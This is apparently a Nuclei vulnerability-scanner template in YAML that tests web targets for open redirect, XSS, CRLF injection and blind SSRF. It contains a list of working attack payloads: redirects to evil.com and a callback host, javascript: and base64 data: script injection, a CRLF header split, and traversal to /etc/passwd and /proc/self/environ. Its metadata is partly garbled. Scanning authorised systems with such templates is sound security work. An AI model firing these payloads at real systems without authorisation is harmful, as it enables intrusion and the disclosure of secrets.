id: advanced-open-redirect-chain

info: open-redirect
  name: UMESH
  author: UMESH
  severity: high 
  description: |
    Open Redirect XSS, CRLF Injection, 
    Blind SSRF redirect vulnerability 
    account takeover internal network access 
    remediation: |
    URLs
    javascript://, data://, vbscript://
  classification:
    cvss-score: 7.4
    cwe-id: CWE-601
  tags: open-redirect,xss,crlf,ssrf,chain

http:
  - raw:
      - |
        GET {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        
      - |
        GET {{path}} HTTP/1.1
        Host: {{Hostname}}
        Origin: {{interactsh-url}}
        Referer: {{interactsh-url}}

    payloads:
      path:
        - "?next=http://evil.com"
        - "?redirect=//evil.com"
        - "?url=https://{{interactsh-url}}"
        - "?return_to=//{{interactsh-url}}/test"
        - "?goto=javascript:alert(document.domain)"
        - "?next=/%0d%0aLocation:%20http://evil.com/%0d%0aContent-Length:%200"
        - "?redirect=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
        - "?url=\\evil.com"
        - "?next=//{{interactsh-url}}/?param=../../../../../../../../etc/passwd"
        - "?redirect=https://{{interactsh-url}}/../../../../../../../../proc/self/environ"

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      # Matcher 1: Open Redirect (302/301 Status  evil.com  Location)
      - type: word
        part: header
        words:
          - "Location: http://evil.com"
          - "Location: //evil.com"
          - "Location: https://evil.com"
          - "Location: \\evil.com"
        condition: or

      # Matcher 2: XSS (javascript:)
      - type: word
        part: body
        words:
          - "<script>alert(document.domain)</script>"
          - "alert(document.domain)"

      # Matcher 3: CRLF Injection
      - type: word
        part: header
        words:
          - "Location: /%0d%0aLocation:"
          - "%0d%0aContent-Length:"

      # Matcher 4: SSRF/Blind Interaction
      - type: dsl
        dsl:
          - "contains(interactsh_protocol, 'http') || contains(interactsh_protocol, 'dns')"

      - type: word
        part: header
        words:
          - "data:text/html"

    extractors:
      - type: regex
        part: header
        regex:
          - "Location: (.*)"

      - type: regex
        part: header
        regex:
          - "Server: (.*)"
          - "X-Powered-By: (.*)"

    max-redirects: 0
